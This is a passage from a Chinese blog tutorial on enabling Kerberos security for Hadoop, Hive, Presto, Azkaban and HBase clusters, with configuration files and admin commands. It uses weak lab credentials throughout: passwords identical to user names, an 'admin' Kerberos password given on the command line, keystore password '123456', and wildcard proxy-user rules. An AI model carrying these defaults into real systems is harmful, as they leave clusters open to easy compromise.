$HADOOP_HOME/etc/hadoop/core-site.xml</code></p><p><strong>删除</strong>以下参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>atguigu<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.atguigu.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.atguigu.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.atguigu.users<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>增加</strong>以下参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hive.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hive.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.hive.users<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发配置core-site.xml文件</span></span><br><span class="line">xsync <span class="variable">$HADOOP_HOME</span>/etc/hadoop/core-site.xml</span><br><span class="line"><span class="comment"># 重启Hadoop集群</span></span><br><span class="line">stop-dfs.sh</span><br><span class="line">stop-yarn.sh</span><br><span class="line"></span><br><span class="line">start-dfs.sh</span><br><span class="line">start-yarn.sh</span><br></pre></td></tr></table></figure><h3 id="1-3-启动hiveserver2">1.3 启动hiveserver2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注：需使用hive用户启动</span></span><br><span class="line">sudo -i -u hive hiveserver2</span><br></pre></td></tr></table></figure><h2 id="2、Hive-Kerberos认证使用说明">2、Hive Kerberos认证使用说明</h2><p><em>以下说明均基于普通用户</em></p><h3 id="2-1-beeline客户端">2.1 beeline客户端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 认证，执行以下命令，并按照提示输入密码</span></span><br><span class="line">kinit shawn</span><br><span class="line"><span class="comment"># 使用beeline客户端连接hiveserver2</span></span><br><span class="line">beeline</span><br><span class="line"><span class="comment"># 使用如下url进行连接</span></span><br><span class="line">!connect jdbc:hive2://hadoop102:10000/;principal=hive/hadoop102@EXAMPLE.COM</span><br><span class="line"><span class="comment"># 测试查询</span></span><br></pre></td></tr></table></figure><h3 id="2-2-DataGrip客户端">2.2 DataGrip客户端</h3><blockquote><p>jar包获取：<a href="https://download.csdn.net/download/lemon_TT/87951242" target="_blank" rel="noopener" title="https://download.csdn.net/download/lemon_TT/87951242">https://download.csdn.net/download/lemon_TT/87951242</a></p></blockquote><p>首先需要<strong>新建driver</strong>(自带的没有认证功能)，<strong>配置Driver</strong>，<code>url模板：jdbc:hive2://{host}:{port}/{database}[;&lt;;,{:identifier}={:param}&gt;]</code>(注意jar包路径)</p><p><img src="http://qnypic.shawncoding.top/blog/202404161644140.png" alt></p><p>第二步新建连接，选择刚刚创建的driver，选择配置连接，<code>url：jdbc:hive2://hadoop102:10000/;principal=hive/hadoop102@EXAMPLE.COM</code></p><p><img src="http://qnypic.shawncoding.top/blog/202404161644141.png" alt></p><p>选择高级配置，配置参数，注意路径要有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.krb5.conf=<span class="string">"C:\\ProgramData\\MIT\\Kerberos5\\krb5.ini"</span></span><br><span class="line">-Djava.security.auth.login.config=<span class="string">"C:\\ProgramData\\MIT\\Kerberos5\\shawn.conf"</span></span><br><span class="line">-Djavax.security.auth.useSubjectCredsOnly=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202404161644142.png" alt></p><p>编写JAAS（Java认证授权服务）配置文件，内容如下，文件名和路径须和上图中<code>java.security.auth.login.config</code>参数的值保持一致。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.sun.security.jgss.initiate&#123;</span><br><span class="line">      com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">      useKeyTab=<span class="literal">true</span></span><br><span class="line">      useTicketCache=<span class="literal">false</span></span><br><span class="line">      keyTab=<span class="string">"C:\\ProgramData\\MIT\\Kerberos5\\shawn.keytab"</span></span><br><span class="line">      principal=<span class="string">"shawn@EXAMPLE.COM"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为用户生成keytab文件，在krb5kdc所在节点（hadoop102）执行以下命令，然后将生成的atguigu.keytab文件，置于Windows中的特定路径，测试连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q<span class="string">"xst -norandkey -k /home/shawn/shawn.keytab shawn"</span></span><br></pre></td></tr></table></figure><h1>四、安全环境实战</h1><blockquote><p>Hadoop启用Kerberos安全认证之后，之前的非安全环境下的全流程调度脚本和即席查询引擎均会遇到认证问题，故需要对其进行改进，本章内容仅限参考，具体可以参考官网</p></blockquote><h2 id="1、数仓全流程改造">1、数仓全流程改造</h2><p>此处统一将数仓的全部数据资源的所有者设为hive用户，全流程的每步操作均认证为hive用户</p><h3 id="1-1-用户准备">1.1 用户准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在各节点创建hive用户，如已存在则跳过，三个节点</span></span><br><span class="line">useradd hive -g hadoop</span><br><span class="line"><span class="built_in">echo</span> hive | passwd --stdin hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为hive用户创建Keberos主体，102节点</span></span><br><span class="line"><span class="comment"># 创建主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey hive"</span></span><br><span class="line"><span class="comment"># 生成keytab文件</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/hive.keytab hive"</span></span><br><span class="line"><span class="comment"># 修改keytab文件所有者和访问权限</span></span><br><span class="line">chown hive:hadoop /etc/security/keytab/hive.keytab</span><br><span class="line">chmod 440 /etc/security/keytab/hive.keytab</span><br><span class="line"><span class="comment"># 分发keytab文件</span></span><br><span class="line">xsync /etc/security/keytab/hive.keytab</span><br></pre></td></tr></table></figure><h3 id="1-2-数据采集通道修改">1.2 数据采集通道修改</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改/opt/module/flume/conf/kafka-flume-hdfs.conf配置文件，</span></span><br><span class="line">vim /opt/module/flume/conf/kafka-flume-hdfs.conf</span><br><span class="line"><span class="comment"># 增加以下参数</span></span><br><span class="line">a1.sinks.k1.hdfs.kerberosPrincipal=hive@EXAMPLE.COM</span><br><span class="line">a1.sinks.k1.hdfs.kerberosKeytab=/etc/security/keytab/hive.keytab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 业务数据</span></span><br><span class="line"><span class="comment"># 修改sqoop每日同步脚本/home/atguigu/bin/mysql_to_hdfs.sh</span></span><br><span class="line"><span class="comment"># 在顶部增加如下认证语句,shell脚本都可以如此认证</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数仓各层脚本均需在顶部加入如下认证语句</span></span><br><span class="line">kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"><span class="comment"># 举例</span></span><br><span class="line"><span class="comment"># 表示将text内容加入到file文件的第1行之后</span></span><br><span class="line">sed -i <span class="string">'1 a kinit -kt /etc/security/keytab/hive.keytab hive'</span> hdfs_to_ods_log.sh</span><br></pre></td></tr></table></figure><h3 id="1-3-修改HDFS特定路径所有者">1.3 修改HDFS特定路径所有者</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 认证为hdfs用户，执行以下命令并按提示输入密码</span></span><br><span class="line">kinit hdfs/hadoop</span><br><span class="line"><span class="comment"># 修改数据采集目标路径</span></span><br><span class="line">hadoop fs -chown -R hive:hadoop /origin_data</span><br><span class="line">hadoop fs -chown -R hive:hadoop /warehouse</span><br><span class="line"><span class="comment"># 修改hive家目录/user/hive</span></span><br><span class="line">hadoop fs -chown -R hive:hadoop /user/hive</span><br><span class="line"><span class="comment"># 修改spark.eventLog.dir路径</span></span><br><span class="line">hadoop fs -chown -R hive:hadoop /spark-history</span><br></pre></td></tr></table></figure><h3 id="1-4-Azkaban举例">1.4 Azkaban举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在各节点创建azkaban用户</span></span><br><span class="line">useradd azkaban -g hadoop</span><br><span class="line"><span class="built_in">echo</span> azkaban | passwd --stdin azkaban</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将各节点Azkaban安装路径所有者改为azkaban用户</span></span><br><span class="line">chown -R azkaban:hadoop /opt/module/azkaban</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用azkaban用户启动Azkaban</span></span><br><span class="line"><span class="comment"># 在各节点执行以下命令，启动Executor</span></span><br><span class="line">sudo -i -u azkaban bash -c <span class="string">"cd /opt/module/azkaban/azkaban-exec;bin/start-exec.sh"</span></span><br><span class="line"><span class="comment"># 激活Executor Server，任选一台节点执行以下激活命令即可</span></span><br><span class="line">curl http://hadoop102:12321/executor?action=activate</span><br><span class="line">curl http://hadoop103:12321/executor?action=activate</span><br><span class="line">curl http://hadoop104:12321/executor?action=activate</span><br><span class="line"><span class="comment"># 启动Web Server</span></span><br><span class="line">sudo -i -u azkaban bash -c <span class="string">"cd /opt/module/azkaban/azkaban-web;bin/start-web.sh"</span></span><br><span class="line"><span class="comment"># 修改数仓各层脚本访问权限，确保azkaban用户能够访问到,三台机器都设置</span></span><br><span class="line">chown -R atguigu:hadoop /home/atguigu</span><br><span class="line">chmod 770 /home/atguigu</span><br></pre></td></tr></table></figure><h2 id="2、即席查询之Presto">2、即席查询之Presto</h2><h3 id="2-1-改动说明">2.1 改动说明</h3><p>Presto集群开启Kerberos认证可只配置Presto Coordinator和Presto Cli之间进行认证，集群内部通讯可不进行认证。Presto Coordinator和Presto Cli之间的认证要求两者采用更为安全的HTTPS协议进行通讯。</p><p>若Presto对接的是Hive数据源，由于其需要访问Hive的元数据和HDFS上的数据文件，故也需要对Hive Connector进行Kerberos认证</p><h3 id="2-2-用户准备">2.2 用户准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在所有节点创建presto系统用户</span></span><br><span class="line">useradd presto -g hadoop</span><br><span class="line"><span class="built_in">echo</span> presto | passwd --stdin presto</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为Hive Connector创建Kerberos主体,hadoop102节点</span></span><br><span class="line"><span class="comment"># 创建presto用户的Kerberos主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey presto"</span></span><br><span class="line"><span class="comment"># 生成keytab文件</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/presto.keytab presto"</span></span><br><span class="line"><span class="comment"># 修改keytab文件的访问权限</span></span><br><span class="line">chown presto:hadoop /etc/security/keytab/presto.keytab</span><br><span class="line"><span class="comment"># 分发keytab文件</span></span><br><span class="line">xsync /etc/security/keytab/presto.keytab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为Presto Coordinator创建Kerberos主体,HADOOP102节点</span></span><br><span class="line"><span class="comment"># 创建presto用户的Kerberos主体</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey presto/hadoop102"</span></span><br><span class="line"><span class="comment"># 生成keytab文件</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/presto.service.keytab presto/hadoop102"</span></span><br><span class="line"><span class="comment"># 修改keytab文件的访问权限</span></span><br><span class="line">chown presto:hadoop /etc/security/keytab/presto.service.keytab</span><br></pre></td></tr></table></figure><h3 id="2-3-创建HTTPS协议所需的密钥对">2.3 创建HTTPS协议所需的密钥对</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意：</span></span><br><span class="line"><span class="comment"># （1）alias（别名）需要和Presto Coordinator的Kerberos主体名保持一致</span></span><br><span class="line"><span class="comment"># （2）名字与姓氏 需要填写Coordinator所在的主机名</span></span><br><span class="line"><span class="comment"># 使用Java提供的keytool工具生成密钥对</span></span><br><span class="line">keytool -genkeypair -<span class="built_in">alias</span> presto -keyalg RSA -keystore /etc/security/keytab/keystore.jks</span><br><span class="line"><span class="comment"># 您的名字与姓氏是什么?</span></span><br><span class="line"><span class="comment">#  [Unknown]:  hadoop102</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改keystore文件的所有者和访问权限</span></span><br><span class="line">chown presto:hadoop /etc/security/keytab/keystore.jks</span><br><span class="line">chmod 660 /etc/security/keytab/keystore.jks</span><br></pre></td></tr></table></figure><h3 id="2-4-修改Presto-Coordinator配置文件">2.4 修改Presto Coordinator配置文件</h3><p>在<code>/opt/module/presto/etc/config.properties</code>文件中<strong>增加</strong>以下参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http-server.authentication.type=KERBEROS</span><br><span class="line"></span><br><span class="line">http.server.authentication.krb5.service-name=presto</span><br><span class="line">http.server.authentication.krb5.keytab=/etc/security/keytab/presto.service.keytab</span><br><span class="line">http.authentication.krb5.config=/etc/krb5.conf</span><br><span class="line"></span><br><span class="line">http-server.https.enabled=<span class="literal">true</span></span><br><span class="line">http-server.https.port=7778</span><br><span class="line">http-server.https.keystore.path=/etc/security/keytab/keystore.jks</span><br><span class="line">http-server.https.keystore.key=123456</span><br></pre></td></tr></table></figure><h3 id="2-5-修改Hive-Connector配置文件">2.5 修改Hive Connector配置文件</h3><p>在<code>/opt/module/presto/etc/catalog/hive.properties</code>中增加以下参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hive.metastore.authentication.type=KERBEROS</span><br><span class="line">hive.metastore.service.principal=hive/hadoop102@EXAMPLE.COM</span><br><span class="line">hive.metastore.client.principal=presto@EXAMPLE.COM</span><br><span class="line">hive.metastore.client.keytab=/etc/security/keytab/presto.keytab</span><br><span class="line"></span><br><span class="line">hive.hdfs.authentication.type=KERBEROS</span><br><span class="line">hive.hdfs.impersonation.enabled=<span class="literal">true</span></span><br><span class="line">hive.hdfs.presto.principal=presto@EXAMPLE.COM</span><br><span class="line">hive.hdfs.presto.keytab=/etc/security/keytab/presto.keytab</span><br><span class="line">hive.config.resources=/opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml,/opt/module/hadoop-3.1.3/etc/hadoop/hdfs-site.xml</span><br></pre></td></tr></table></figure><p>分发/opt/module/presto/etc/catalog/hive.properties文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xsync /opt/module/presto/etc/catalog/hive.properties</span><br></pre></td></tr></table></figure><h3 id="2-6-配置客户端Kerberos主体到用户名之间的映射规则">2.6 配置客户端Kerberos主体到用户名之间的映射规则</h3><p>新建<code>/opt/module/presto/etc/access-control.properties</code>配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access-control.name=file</span><br><span class="line">security.config-file=etc/rules.json</span><br></pre></td></tr></table></figure><p>新建<code>/opt/module/presto/etc/rules.json</code>文件，内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"catalogs"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"allow"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">"user_patterns"</span>: [</span><br><span class="line">    <span class="string">"(.*)"</span>,</span><br><span class="line">    <span class="string">"([a-zA-Z]+)/?.*@.*"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-7-配置Presto代理用户">2.7 配置Presto代理用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改Hadoop配置文件</span></span><br><span class="line"><span class="comment"># 修改$HADOOP_HOME/etc/hadoop/core-site.xml配置文件，增加如下内容</span></span><br><span class="line">vim <span class="variable">$HADOOP_HOME</span>/etc/hadoop/core-site.xml</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.proxyuser.presto.hosts&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.proxyuser.presto.groups&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;hadoop.proxyuser.presto.users&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发修改的文件</span></span><br><span class="line">xsync <span class="variable">$HADOOP_HOME</span>/etc/hadoop/core-site.xml</span><br><span class="line"><span class="comment"># 重启Hadoop集群</span></span><br><span class="line">stop-dfs.sh</span><br><span class="line">stop-yarn.sh</span><br><span class="line"></span><br><span class="line">start-dfs.sh</span><br><span class="line">start-yarn.sh</span><br></pre></td></tr></table></figure><h3 id="2-8-重启Presto集群">2.8 重启Presto集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭集群,三台机器依次执行</span></span><br><span class="line">/opt/module/presto/bin/launcher stop</span><br><span class="line"><span class="comment"># 修改Presto安装路径所有者为presto,三台机器依次执行</span></span><br><span class="line">chown -R presto:hadoop /opt/module/presto</span><br><span class="line"><span class="comment"># 使用hive用户启动MetaStore服务，102机器</span></span><br><span class="line">sudo -i -u hive hive --service metastore</span><br><span class="line"><span class="comment"># 使用presto用户启动Presto集群，三台机器</span></span><br><span class="line">sudo -i -u presto /opt/module/presto/bin/launcher</span><br></pre></td></tr></table></figure><h3 id="2-9-客户端认证访问Presto集群">2.9 客户端认证访问Presto集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 102机器执行</span></span><br><span class="line">./prestocli \</span><br><span class="line">--server https://hadoop102:7778 \</span><br><span class="line">--catalog hive \</span><br><span class="line">--schema default \</span><br><span class="line">--<span class="built_in">enable</span>-authentication \</span><br><span class="line">--krb5-remote-service-name presto \</span><br><span class="line">--krb5-config-path /etc/krb5.conf \</span><br><span class="line">--krb5-principal atguigu@EXAMPLE.COM \</span><br><span class="line">--krb5-keytab-path /home/atguigu/atguigu.keytab \</span><br><span class="line">--keystore-path /etc/security/keytab/keystore.jks \</span><br><span class="line">--keystore-password 123456 \</span><br><span class="line">--user atguigu</span><br></pre></td></tr></table></figure><h2 id="3、即席查询之Kylin">3、即席查询之Kylin</h2><h3 id="3-1-改动说明">3.1 改动说明</h3><p>从Kylin的架构，可以看出Kylin充当只是一个Hadoop客户端，读取Hive数据，利用MR或Spark进行计算，将Cube存储至HBase中。所以在安全的Hadoop环境下，Kylin不需要做额外的配置，只需要具备一个Kerberos主体，进行常规的认证即可</p><p>但是Kylin(这里的kylin版本为3.x)所依赖的HBase需要进行额外的配置，才能在安全的Hadoop环境下正常工作</p><h3 id="3-2-HBase开启Kerberos认证">3.2 HBase开启Kerberos认证</h3><p>首先进行用户准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在各节点创建hbase系统用户</span></span><br><span class="line">useradd -g hadoop hbase</span><br><span class="line"><span class="built_in">echo</span> hbase | passwd --stdin hbase</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建hbase Kerberos主体</span></span><br><span class="line"><span class="comment"># 在hadoop102节点创建主体，生成密钥文件，并修改所有者</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey hbase/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/hbase.service.keytab hbase/hadoop102"</span></span><br><span class="line">chown hbase:hadoop /etc/security/keytab/hbase.service.keytab</span><br><span class="line"><span class="comment"># 在hadoop103节点创建主体，生成密钥文件，并修改所有者</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey hbase/hadoop103"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/hbase.service.keytab hbase/hadoop103"</span></span><br><span class="line">chown hbase:hadoop /etc/security/keytab/hbase.service.keytab</span><br><span class="line"><span class="comment"># 在hadoop104节点创建主体，生成密钥文件，并修改所有者</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey hbase/hadoop104"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/hbase.service.keytab hbase/hadoop104"</span></span><br><span class="line">chown hbase:hadoop 